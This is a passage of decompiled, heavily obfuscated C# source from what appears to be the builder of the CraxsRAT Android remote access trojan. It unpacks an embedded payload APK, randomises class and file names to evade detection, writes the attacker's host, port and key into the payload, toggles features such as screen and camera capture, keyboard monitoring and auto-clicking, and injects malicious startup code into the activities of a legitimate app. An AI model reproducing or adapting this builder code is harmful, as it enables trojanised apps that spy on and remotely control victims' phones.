              Directory.CreateDirectory(this.TheApkPath + EXGuarder.\u00346450454);
              Directory.CreateDirectory(this.TheApkPath + EXGuarder.\u003235A5D76);
              destinationDirectoryName = this.TheApkPath + EXGuarder.\u00346450454;
              num54 = (int) num56 * 791895388 ^ -198922022;
              continue;
            case 1:
              Directory.CreateDirectory(this.TheApkPath + EXGuarder.\u0036C553747);
              num54 = (int) num56 * -1132077740 ^ -1208222102;
              continue;
            case 2:
              goto label_145;
            case 3:
              destinationDirectoryName = this.TheApkPath + EXGuarder.\u0033C042121 + num53.ToString();
              num54 = (int) num56 * -526162484 ^ 77089586;
              continue;
            case 4:
              File.WriteAllText(this.TheApkPath + EXGuarder.\u00312373275, Craxs_Rat.My.Resources.Resources.accessibilityprivatesrcapp);
              int num57;
              num54 = num57 = Directory.Exists(this.TheApkPath + EXGuarder.\u0036C553747) ? -275933055 : (num57 = 524067065);
              continue;
            case 6:
              Directory.CreateDirectory(this.TheApkPath + EXGuarder.\u0033C042121 + num53.ToString());
              Directory.CreateDirectory(this.TheApkPath + EXGuarder.\u0033C042121 + num53.ToString() + EXGuarder.\u003781E1D1B);
              num54 = (int) num56 * 449840517 ^ -238253451;
              continue;
            case 7:
              Thread.Sleep(1);
              int num58 = Directory.Exists(this.TheApkPath + EXGuarder.\u0036C553747) ? -2003798113 : (num58 = -39980220);
              num54 = num58 ^ (int) num56 * -617583369;
              continue;
            case 8:
              int num59;
              num54 = num59 = File.Exists(destinationDirectoryName + EXGuarder.\u00347492C68) ? 915413359 : (num59 = -1846201923);
              continue;
            case 9:
              File.WriteAllBytes(destinationDirectoryName + EXGuarder.\u00347492C68, Craxs_Rat.My.Resources.Resources.APPS);
              num54 = (int) num56 * -299036061 ^ 1633591844;
              continue;
            case 10:
              num54 = (int) num56 * 526751283 ^ -1417289230;
              continue;
            case 11:
              checked { ++num53; }
              int num60;
              num54 = num60 = num53 > 16 ? -1044739946 : (num60 = -248925124);
              continue;
            case 12:
              int num61;
              num54 = num61 = destinationDirectoryName != null ? -767103974 : (num61 = 471463506);
              continue;
            case 13:
              Directory.CreateDirectory(this.TheApkPath + EXGuarder.\u0036C553747);
              num54 = (int) num56 * -963201554 ^ 5581591;
              continue;
            case 14:
              int num62;
              num54 = num62 = Directory.Exists(this.TheApkPath + EXGuarder.\u0033C042121 + num53.ToString()) ? 2063584499 : (num62 = 437140084);
              continue;
            case 15:
              ZipFile.ExtractToDirectory(destinationDirectoryName + EXGuarder.\u00347492C68, destinationDirectoryName);
              File.Delete(destinationDirectoryName + EXGuarder.\u00347492C68);
              num54 = 304182439;
              continue;
            default:
              goto label_162;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.AppendText(EXGuarder.\u00345550A06 + exception.Message);
        ProjectData.ClearProjectError();
      }
label_162:
      try
      {
        this.log.AppendText(Environment.NewLine + EXGuarder.\u0033861076F);
label_163:
        int num63 = 1253122906;
        while (true)
        {
          int num64 = num63;
          uint num65;
          string[] strArray;
          int index3;
          string path;
          string str3;
          string path2_1;
          int index4;
          string[] files1;
          int minCharacters;
          int maxCharacters;
          string path2_2;
          string[] files2;
          int index5;
          string[] files3;
          string searchPattern;
          int num66;
          switch ((num65 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num64 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 65U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u003755E1C24, ((Jector._Closure\u0024__287\u002D0) this).N_newEngineWorkerins)));
              num63 = (int) num65 * -1123285621 ^ -1922091321;
              continue;
            case 1:
              ((NotificationMaker) this).NEWRANDOM = this.madladstr();
              num63 = (int) num65 * -2114296200 ^ -1302879234;
              continue;
            case 2:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u003560F2D2C, this.N__ask_prim_)));
              num63 = (int) num65 * -985697824 ^ -1938125933;
              continue;
            case 3:
              int num67;
              num63 = num67 = index3 < strArray.Length ? 1643684198 : (num67 = -2068700521);
              continue;
            case 4:
              checked { ++index5; }
              num63 = (int) num65 * 1462579913 ^ -229590654;
              continue;
            case 5:
              ((NotificationMaker) this).newplgs = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * -1647087048 ^ 1347805464;
              continue;
            case 6:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u00302330D44, ((LanguageSelector) this).N__scctrl_)));
              num63 = (int) num65 * -954030973 ^ -1960753635;
              continue;
            case 7:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u0036240654C, ((KeyboardManager) this).N_cap_sc_)));
              num63 = (int) num65 * 1796969613 ^ -1766224133;
              continue;
            case 8:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u00344697106, ((KeyboardManager) this).N__SCRActivity_)));
              num63 = (int) num65 * -1131742060 ^ -90630692;
              continue;
            case 9:
              path = strArray[index3];
              num63 = 1393126140;
              continue;
            case 10:
              ((NotificationMaker) this).newcnm = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 2054416458 ^ -2004938029;
              continue;
            case 11:
              str3 = destinationDirectoryName + EXGuarder.\u003781E1D1B;
              searchPattern = EXGuarder.\u0032108386B;
              num66 = 0;
              files2 = Directory.GetFiles(str3, searchPattern, SearchOption.AllDirectories);
              index5 = 0;
              num63 = (int) num65 * -826290216 ^ 755901254;
              continue;
            case 12:
              int num68;
              num63 = num68 = !(path2_1.Contains(EXGuarder.\u00344697106) | path2_1.Equals(EXGuarder.\u00344697106)) ? -436250244 : (num68 = -2101486598);
              continue;
            case 13:
              int num69;
              num63 = num69 = !(path2_1.Contains(EXGuarder.\u00302330D44) | path2_1.Equals(EXGuarder.\u00302330D44)) ? 211769000 : (num69 = -609656281);
              continue;
            case 14:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u0033748544A, ((KeyboardManager) this).N_WackMeUpJob)));
              num63 = (int) num65 * -1971098122 ^ 1476894547;
              continue;
            case 15:
              index4 = 0;
              num63 = (int) num65 * -482801803 ^ 431489224;
              continue;
            case 16:
              int num70;
              num63 = num70 = !(path2_1.Contains(EXGuarder.\u0035B255E07) | path2_1.Equals(EXGuarder.\u0035B255E07)) ? -1564801119 : (num70 = -1412631648);
              continue;
            case 17:
              ((NotificationMaker) this).newhost = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * -815901657 ^ -1062202232;
              continue;
            case 18:
              int num71;
              num63 = num71 = !(path2_1.Contains(EXGuarder.\u0035D450206) | path2_1.Equals(EXGuarder.\u0035D450206)) ? -1029824605 : (num71 = 783066706);
              continue;
            case 19:
              path2_1 = files2[index5];
              num63 = 2040037716;
              continue;
            case 20:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u00358635449, ((KeyboardManager) this).N__ask_draw_)));
              num63 = (int) num65 * -441360904 ^ 1791311442;
              continue;
            case 21:
              goto label_163;
            case 22:
              int num72;
              num63 = num72 = !(path2_1.Contains(EXGuarder.\u0033748544A) | path2_1.Equals(EXGuarder.\u0033748544A)) ? 225448509 : (num72 = -121747087);
              continue;
            case 23:
              int num73;
              num63 = num73 = !(path2_1.Contains(EXGuarder.\u00358635449) | path2_1.Equals(EXGuarder.\u00358635449)) ? 2072066434 : (num73 = -349200236);
              continue;
            case 24:
              ((NotificationMaker) this).newname = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * -1967431293 ^ -445923189;
              continue;
            case 25:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u0035D450206, ((KeyboardManager) this).N__CamActivity_)));
              num63 = (int) num65 * -286224938 ^ 1830843715;
              continue;
            case 26:
              Thread.Sleep(1);
              num63 = (int) num65 * -1611607622 ^ 1652639525;
              continue;
            case 27:
              int num74;
              num63 = num74 = !(path2_1.Contains(EXGuarder.\u0036240654C) | path2_1.Equals(EXGuarder.\u0036240654C)) ? 878617445 : (num74 = -1142174268);
              continue;
            case 28:
              strArray = files1;
              num63 = (int) num65 * -393940104 ^ -478772061;
              continue;
            case 29:
              Thread.Sleep(1);
              num63 = (int) num65 * -1427371995 ^ -1743628896;
              continue;
            case 30:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              string str4 = File.ReadAllText(path).Replace(EXGuarder.\u003560F2D2C, this.N__ask_prim_).Replace(EXGuarder.\u0035B255E07, this.N__access_ask_).Replace(EXGuarder.\u003755E1C24, ((Jector._Closure\u0024__287\u002D0) this).N_newEngineWorkerins).Replace(EXGuarder.\u0035E283C57, ((Jector._Closure\u0024__287\u002D1) this).N__srv_worker_).Replace(EXGuarder.\u0036240654C, ((KeyboardManager) this).N_cap_sc_).Replace(EXGuarder.\u00316292955, ((KeyboardManager) this).N_update_app_).Replace(EXGuarder.\u00377422707, ((LanguageSelector) this).N__webviewer_).Replace(EXGuarder.\u00344697106, ((KeyboardManager) this).N__SCRActivity_).Replace(EXGuarder.\u0035D450206, ((KeyboardManager) this).N__CamActivity_).Replace(EXGuarder.\u0034151693C, ((KeyboardManager) this).N__ask_battary_).Replace(EXGuarder.\u00302330D44, ((LanguageSelector) this).N__scctrl_).Replace(EXGuarder.\u0035E550E6A, ((KeyboardManager) this).N_ClassGen).Replace(EXGuarder.\u0034408326B, ((LanguageSelector) this).newgetbyts).Replace(EXGuarder.\u00345635206, ((nonetform) this).newsrvrun).Replace(EXGuarder.\u0032D6E0E63, ((nonetform) this).split1).Replace(EXGuarder.\u003306B5A29, ((nonetform) this).split2).Replace(EXGuarder.\u00348572935, ((nonetform) this).split3).Replace(EXGuarder.\u003552B0235, ((NotificationMaker) this).newplgs).Replace(EXGuarder.\u003660D0124, ((NotificationMaker) this).split4).Replace(EXGuarder.\u00319396D5D, ((NotificationMaker) this).newhost).Replace(this.Decrypt(EXGuarder.\u003343A5F08, ((NotificationMaker) this).TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.TheKey.Text))).Replace(this.Decrypt(EXGuarder.\u00330543769, ((NotificationMaker) this).TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Host.Text))).Replace(this.Decrypt(EXGuarder.\u0034D175963, ((NotificationMaker) this).TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Port.Text)));
              string oldValue1 = EXGuarder.\u0036D753D61;
              bool flag = this.checksuper.Checked;
              string newValue1 = flag.ToString();
              string str5 = str4.Replace(oldValue1, newValue1);
              string oldValue2 = EXGuarder.\u00373285428;
              flag = this.checkkill.Checked;
              string newValue2 = flag.ToString();
              string str6 = str5.Replace(oldValue2, newValue2);
              string oldValue3 = EXGuarder.\u0036A712547;
              flag = this.checkDraw.Checked;
              string newValue3 = flag.ToString();
              string str7 = str6.Replace(oldValue3, newValue3);
              string oldValue4 = EXGuarder.\u003145D540A;
              flag = this.checkautoclick.Checked;
              string newValue4 = flag.ToString();
              string contents = str7.Replace(oldValue4, newValue4).Replace(EXGuarder.\u00323740F63, ((PermissionsManager) this).ASKPRIM_all.ToString()).Replace(EXGuarder.\u0033B432632, EXGuarder.\u003705C026F).Replace(EXGuarder.\u0030A377806, this.CLiname.Text).Replace(EXGuarder.\u0034B701373, ((NotificationMaker) this).newport).Replace(EXGuarder.\u003133F6A2D, ((NotificationMaker) this).newkey).Replace(EXGuarder.\u0032D3C3145, ((NotificationMaker) this).newalive).Replace(EXGuarder.\u00354200C14, ((NotificationMaker) this).newname).Replace(EXGuarder.\u00344372470, ((NotificationMaker) this).neweco).Replace(EXGuarder.\u0033D1F1657, ((NotificationMaker) this).newcnl).Replace(EXGuarder.\u003546F2A4D, ((NotificationMaker) this).newcnm).Replace(EXGuarder.\u0036A371F28, this.titletext.Text).Replace(EXGuarder.\u00347016F78, this.msgtext.Text).Replace(EXGuarder.\u0031537292A, ((NotificationMaker) this).newsndmthd).Replace(EXGuarder.\u003244A0064, ((NotificationMaker) this).newsndmthd).Replace(EXGuarder.\u003244A0064, ((NotificationMaker) this).newforuce).Replace(EXGuarder.\u00379151326, ((NotificationMaker) this).newsokt).Replace(EXGuarder.\u003620F562D, ((NotificationMaker) this).KeepScreen).Replace(EXGuarder.\u00368134772, Conversions.ToString(this.RandomShit(minCharacters, maxCharacters))).Replace(EXGuarder.\u0033D405A25, ((NotificationMaker) this).newstrtconct).Replace(EXGuarder.\u003632E0901, ((NotificationMaker) this).newconect).Replace(EXGuarder.\u0031B381E0B, ((NotificationMaker) this).NEWRANDOM).Replace(EXGuarder.\u00358635449, ((KeyboardManager) this).N__ask_draw_).Replace(EXGuarder.\u0033748544A, ((KeyboardManager) this).N_WackMeUpJob);
              File.WriteAllText(path, contents);
              Thread.Sleep(1);
              num63 = (int) num65 * -929299389 ^ 2050587824;
              continue;
            case 31:
              ((nonetform) this).split1 = Conversions.ToString(this.RandomShit(4, 4));
              ((nonetform) this).split2 = Conversions.ToString(this.RandomShit(4, 4));
              ((nonetform) this).split3 = Conversions.ToString(this.RandomShit(4, 4));
              ((NotificationMaker) this).split4 = Conversions.ToString(this.RandomShit(4, 4));
              num63 = (int) num65 * 1385432794 ^ 780365794;
              continue;
            case 32:
              num63 = (int) num65 * -698559044 ^ 1888688709;
              continue;
            case 33:
              int num75;
              num63 = num75 = !(path2_1.Contains(EXGuarder.\u00377422707) | path2_1.Equals(EXGuarder.\u00377422707)) ? -402916967 : (num75 = 1237374624);
              continue;
            case 34:
              int num76;
              num63 = num76 = index5 < files2.Length ? 1802361449 : (num76 = 2025712194);
              continue;
            case 35:
              int num77 = !(path2_1.Contains(EXGuarder.\u003560F2D2C) | path2_1.Equals(EXGuarder.\u003560F2D2C)) ? -502078565 : (num77 = 1236443294);
              num63 = num77 ^ (int) num65 * -307165716;
              continue;
            case 36:
              int num78;
              num63 = num78 = !(path2_1.Contains(EXGuarder.\u003755E1C24) | path2_1.Equals(EXGuarder.\u003755E1C24)) ? 216602311 : (num78 = 627699298);
              continue;
            case 37:
              index3 = 0;
              num63 = (int) num65 * 1260669520 ^ 702743461;
              continue;
            case 39:
              int num79;
              num63 = num79 = !(path2_1.Contains(EXGuarder.\u0034151693C) | path2_1.Equals(EXGuarder.\u0034151693C)) ? -537388762 : (num79 = 1698194840);
              continue;
            case 40:
              ((NotificationMaker) this).newforuce = EXGuarder.\u00315030765;
              num63 = (int) num65 * -1719036220 ^ -622027122;
              continue;
            case 41:
              files1 = Directory.GetFiles(destinationDirectoryName + EXGuarder.\u003781E1D1B);
              minCharacters = 30;
              maxCharacters = 35;
              ((LanguageSelector) this).newgetbyts = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * -1265046185 ^ -1131565520;
              continue;
            case 42:
              ((nonetform) this).newsrvrun = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 1884778170 ^ -333180749;
              continue;
            case 43:
              checked { ++num66; }
              num63 = 367195259;
              continue;
            case 44:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u0035B255E07, this.N__access_ask_)));
              num63 = (int) num65 * -163629730 ^ 1783450765;
              continue;
            case 45:
              ((NotificationMaker) this).neweco = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 888101005 ^ -1582014024;
              continue;
            case 46:
              File.Move(Path.Combine(str3, path2_2), Path.Combine(str3, path2_2.Replace(EXGuarder.\u0035E550E6A, ((KeyboardManager) this).N_ClassGen)));
              num63 = (int) num65 * 1682770481 ^ 253219959;
              continue;
            case 47:
              num63 = (int) num65 * -119795543 ^ 96569265;
              continue;
            case 48:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u0034151693C, ((KeyboardManager) this).N__ask_battary_)));
              num63 = (int) num65 * -842675653 ^ 1083726944;
              continue;
            case 49:
              ((NotificationMaker) this).newsokt = Conversions.ToString(this.RandomShit(30, 35));
              ((NotificationMaker) this).newstrtconct = Conversions.ToString(this.RandomShit(30, 35));
              ((NotificationMaker) this).newcnl = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * -1912795092 ^ 1014448141;
              continue;
            case 50:
              ((NotificationMaker) this).newport = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 476981031 ^ -1948496479;
              continue;
            case 51:
              int num80;
              num63 = num80 = !(path2_1.Contains(EXGuarder.\u0035E283C57) | path2_1.Equals(EXGuarder.\u0035E283C57)) ? 1259367814 : (num80 = 1370850121);
              continue;
            case 52:
              path2_2 = files3[index4];
              int num81;
              num63 = num81 = !path2_2.Contains(EXGuarder.\u0035E550E6A) ? 1654751642 : (num81 = -423477495);
              continue;
            case 53:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u00316292955, ((KeyboardManager) this).N_update_app_)));
              num63 = (int) num65 * -1961682766 ^ 1445542452;
              continue;
            case 54:
              ((NotificationMaker) this).newsndmthd = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 1723046907 ^ -334608391;
              continue;
            case 55:
              // ISSUE: reference to a compiler-generated field
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u0035E283C57, ((Jector._Closure\u0024__287\u002D1) this).N__srv_worker_)));
              num63 = (int) num65 * 964172530 ^ 1542636588;
              continue;
            case 56:
              int num82;
              num63 = num82 = index4 < files3.Length ? -1743390745 : (num82 = 1240741625);
              continue;
            case 57:
              checked { ++index3; }
              num63 = (int) num65 * -789827657 ^ 2114816817;
              continue;
            case 58:
              int num83;
              num63 = num83 = !(path2_1.Contains(EXGuarder.\u00316292955) | path2_1.Equals(EXGuarder.\u00316292955)) ? -986650502 : (num83 = 839560175);
              continue;
            case 59:
              checked { ++index4; }
              num63 = (int) num65 * -1363951083 ^ 1781100031;
              continue;
            case 60:
              File.Move(Path.Combine(str3, path2_1), Path.Combine(str3, path2_1.Replace(EXGuarder.\u00377422707, ((LanguageSelector) this).N__webviewer_)));
              num63 = (int) num65 * -1677756522 ^ 433710277;
              continue;
            case 61:
              num66 = 0;
              files3 = Directory.GetFiles(str3, searchPattern, SearchOption.AllDirectories);
              num63 = (int) num65 * -1494831107 ^ -1756408456;
              continue;
            case 62:
              checked { ++num66; }
              num63 = 1868150614;
              continue;
            case 63:
              ((NotificationMaker) this).newconect = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 1184804005 ^ 1574731034;
              continue;
            case 64:
              ((NotificationMaker) this).newkey = Conversions.ToString(this.RandomShit(30, 35));
              ((NotificationMaker) this).newalive = Conversions.ToString(this.RandomShit(30, 35));
              num63 = (int) num65 * 1087895678 ^ -1713964645;
              continue;
            default:
              goto label_232;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.AppendText(Environment.NewLine + EXGuarder.\u0033C306016 + exception.Message);
label_229:
        int num84 = 807570462;
        while (true)
        {
          int num85 = num84;
          uint num86;
          switch ((num86 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num85 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 3U)
          {
            case 0:
              goto label_229;
            case 1:
              ProjectData.ClearProjectError();
              num84 = (int) num86 * -1730433597 ^ 1982238189;
              continue;
            default:
              goto label_232;
          }
        }
      }
label_232:
      this.log.AppendText(Environment.NewLine + EXGuarder.\u00342452C1E);
      int num87 = 0;
      uint num88;
      IEnumerator enumerator1;
      if (this.CheckAutomatic.Checked)
      {
        List<string> activityNames = Codes.GetActivityNames(this.TheApkPath + EXGuarder.\u0032E680D5C, this.checkonlymain.Checked);
        string smaliFolderPath1 = EXGuarder.\u00310755675;
        List<string>.Enumerator enumerator2;
        try
        {
          enumerator2 = activityNames.GetEnumerator();
label_235:
          int num89 = -1054192905;
          while (true)
          {
            int num90 = num89;
            uint num91;
            string[] contents;
            string newValue;
            int num92;
            int index;
            string activityInSmali;
            switch ((num91 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num90 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 19U)
            {
              case 0:
                contents[checked (index + 1)] = contents[checked (index + 1)] + Environment.NewLine + this.D(Craxs_Rat.My.Resources.Resources.oncreatecode).Replace(this.D(EXGuarder.\u00368523735), newValue);
                num89 = -1383413552;
                continue;
              case 1:
                num89 = (int) num91 * -65612086 ^ -1563002422;
                continue;
              case 2:
                goto label_235;
              case 4:
                File.WriteAllLines(activityInSmali, contents);
                num89 = -451709076;
                continue;
              case 5:
                contents[checked (contents.Length - 1)] = contents[checked (contents.Length - 1)] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Craxs_Rat.My.Resources.Resources.MainMith, ((NotificationMaker) this).TK)).Replace(this.D(EXGuarder.\u00368523735), newValue).Replace(EXGuarder.\u003554A166C, ((KeyboardManager) this).N_ClassGen + EXGuarder.\u0035E253817).Replace(EXGuarder.\u0035E550E6A, ((KeyboardManager) this).N_ClassGen);
                num89 = (int) num91 * -1420761166 ^ 1549516779;
                continue;
              case 6:
                checked { ++index; }
                num89 = 2005349536;
                continue;
              case 7:
                contents = File.ReadAllLines(activityInSmali);
                num89 = (int) num91 * 477658230 ^ 242775352;
                continue;
              case 8:
                num89 = (int) num91 * 1029333842 ^ -348822518;
                continue;
              case 9:
                int num93;
                num89 = num93 = enumerator2.MoveNext() ? -1297198687 : (num93 = 1454390391);
                continue;
              case 10:
                num92 = checked (contents.Length - 1);
                index = 0;
                num89 = (int) num91 * -756936971 ^ 1701436039;
                continue;
              case 11:
                int num94;
                num89 = num94 = index != 0 ? -952786063 : (num94 = -1605044035);
                continue;
              case 12:
                int num95;
                num89 = num95 = !contents[index].Contains(this.Decrypt(EXGuarder.\u0035525001B, ((NotificationMaker) this).TK)) ? 1927241980 : (num95 = 987567005);
                continue;
              case 13:
                int num96 = contents[index].ToLower().StartsWith(EXGuarder.\u003012B1264.ToLower()) ? -253599690 : (num96 = 1637376670);
                num89 = num96 ^ (int) num91 * 1578931378;
                continue;
              case 14:
                num89 = (int) num91 * -1614173870 ^ -1566670839;
                continue;
              case 15:
                int num97;
                num89 = num97 = index <= num92 ? 930895136 : (num97 = -2007331973);
                continue;
              case 16:
                activityInSmali = Codes.FindActivityInSmali(this.TheApkPath, enumerator2.Current, smaliFolderPath1);
                num89 = -39386459;
                continue;
              case 17:
                string[] strArray = contents[0].Split(' ');
                newValue = strArray[checked (strArray.Length - 1)];
                num89 = (int) num91 * 1449468131 ^ -1748897862;
                continue;
              case 18:
                int num98 = Operators.CompareString(activityInSmali, EXGuarder.\u003720C3619, false) == 0 ? -1207482810 : (num98 = 1783921186);
                num89 = num98 ^ (int) num91 * -912384310;
                continue;
              default:
                goto label_255;
            }
          }
        }
        finally
        {
          enumerator2.Dispose();
        }
label_255:
        int num99 = 2;
label_256:
        int num100 = -1131740862;
        while (true)
        {
          int num101 = num100;
          switch ((num88 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num101 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 5U)
          {
            case 0:
              goto label_313;
            case 1:
label_258:
              checked { ++num99; }
              if (num99 > 14)
              {
                num100 = 1969273115;
                continue;
              }
              goto case 2;
            case 2:
              if (!Directory.Exists(this.TheApkPath + EXGuarder.\u0033C042121 + num99.ToString()))
                goto case 1;
              else
                goto default;
            case 4:
              goto label_256;
            default:
              string smaliFolderPath2 = EXGuarder.\u0033F650B46 + num99.ToString();
              List<string>.Enumerator enumerator3;
              try
              {
                enumerator3 = activityNames.GetEnumerator();
label_262:
                int num102 = -2089358430;
                while (true)
                {
                  int num103 = num102;
                  uint num104;
                  string[] contents;
                  string[] strArray;
                  int index;
                  string activityInSmali;
                  int num105;
                  string newValue;
                  switch ((num104 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num103 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 18U)
                  {
                    case 0:
                      checked { ++index; }
                      num102 = 40883330;
                      continue;
                    case 1:
                      int num106 = activityInSmali.Equals(EXGuarder.\u003720C3619, StringComparison.CurrentCultureIgnoreCase) ? -120660926 : (num106 = 1518447397);
                      num102 = num106 ^ (int) num104 * -385965559;
                      continue;
                    case 3:
                      num102 = (int) num104 * -1749191683 ^ 822858123;
                      continue;
                    case 4:
                      int num107;
                      num102 = num107 = index <= num105 ? 961814687 : (num107 = -723377766);
                      continue;
                    case 5:
                      int num108;
                      num102 = num108 = index != 0 ? -242747782 : (num108 = 1033675729);
                      continue;
                    case 6:
                      num102 = (int) num104 * -96736705 ^ -1482181433;
                      continue;
                    case 7:
                      goto label_262;
                    case 8:
                      contents[checked (index + 1)] = contents[checked (index + 1)] + Environment.NewLine + this.D(Craxs_Rat.My.Resources.Resources.oncreatecode).Replace(this.D(EXGuarder.\u00368523735), newValue);
                      contents[checked (contents.Length - 1)] = contents[checked (contents.Length - 1)] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Craxs_Rat.My.Resources.Resources.MainMith, ((NotificationMaker) this).TK)).Replace(this.D(EXGuarder.\u00368523735), newValue).Replace(EXGuarder.\u003554A166C, ((KeyboardManager) this).N_ClassGen + EXGuarder.\u0035E253817).Replace(EXGuarder.\u0035E550E6A, ((KeyboardManager) this).N_ClassGen);
                      num102 = -78014241;
                      continue;
                    case 9:
                      strArray = contents[0].Split(' ');
                      num102 = (int) num104 * 1597885832 ^ 477708289;
                      continue;
                    case 10:
                      Console.WriteLine(activityInSmali);
                      contents = File.ReadAllLines(activityInSmali);
                      num105 = checked (contents.Length - 1);
                      index = 0;
                      num102 = (int) num104 * 889042283 ^ 232924601;
                      continue;
                    case 11:
                      int num109;
                      num102 = num109 = enumerator3.MoveNext() ? -859341205 : (num109 = -2058338100);
                      continue;
                    case 12:
                      int num110;
                      num102 = num110 = !contents[index].Contains(this.Decrypt(EXGuarder.\u0035525001B, ((NotificationMaker) this).TK)) ? 1001671522 : (num110 = 573503622);
                      continue;
                    case 13:
                      activityInSmali = Codes.FindActivityInSmali(this.TheApkPath, enumerator3.Current, smaliFolderPath2);
                      num102 = -748135121;
                      continue;
                    case 14:
                      num102 = (int) num104 * -2040730727 ^ -1002178379;
                      continue;
                    case 15:
                      File.WriteAllLines(activityInSmali, contents);
                      num102 = -1805721739;
                      continue;
                    case 16:
                      int num111 = contents[index].ToLower().StartsWith(EXGuarder.\u003012B1264.ToLower()) ? 1296299796 : (num111 = -525318594);
                      num102 = num111 ^ (int) num104 * 106514349;
                      continue;
                    case 17:
                      newValue = strArray[checked (strArray.Length - 1)];
                      num102 = (int) num104 * -1198666312 ^ -806530654;
                      continue;
                    default:
                      goto label_258;
                  }
                }
              }
              finally
              {
                enumerator3.Dispose();
              }
          }
        }
      }
      else
      {
        try
        {
          enumerator1 = this.Activlist.Items.GetEnumerator();
label_283:
          int num112 = 1880175756;
          while (true)
          {
            int num113 = num112;
            switch ((num88 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num113 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 3U)
            {
              case 1:
                if (enumerator1.MoveNext())
                {
                  num112 = -1174036489;
                  continue;
                }
                goto label_313;
              case 2:
                goto label_283;
              default:
                string str8 = Conversions.ToString(enumerator1.Current);
                try
                {
                  string path = str8.Replace(EXGuarder.\u003045D6B32, this.TheApkPath);
                  if (File.Exists(path))
                  {
label_289:
                    int num114 = 1362794436;
                    while (true)
                    {
                      int num115 = num114;
                      uint num116;
                      string[] strArray;
                      string newValue;
                      string[] contents;
                      int index;
                      int num117;
                      switch ((num116 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num115 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 14U)
                      {
                        case 0:
                          int num118;
                          num114 = num118 = !contents[index].Contains(this.Decrypt(EXGuarder.\u0035525001B, ((NotificationMaker) this).TK)) ? -935863180 : (num118 = -886835988);
                          continue;
                        case 2:
                          int num119;
                          num114 = num119 = index != 0 ? 1551998864 : (num119 = 2024574285);
                          continue;
                        case 3:
                          strArray = contents[0].Split(' ');
                          num114 = (int) num116 * 1214500594 ^ -933061619;
                          continue;
                        case 4:
                          checked { ++index; }
                          num114 = 248250039;
                          continue;
                        case 5:
                          int num120;
                          num114 = num120 = index <= num117 ? -858560118 : (num120 = -1739303296);
                          continue;
                        case 6:
                          int num121 = contents[index].ToLower().StartsWith(EXGuarder.\u003012B1264.ToLower()) ? 1958871259 : (num121 = -1873898898);
                          num114 = num121 ^ (int) num116 * -1711211541;
                          continue;
                        case 7:
                          goto label_289;
                        case 8:
                          contents = File.ReadAllLines(path);
                          num114 = (int) num116 * -739329946 ^ -1959380736;
                          continue;
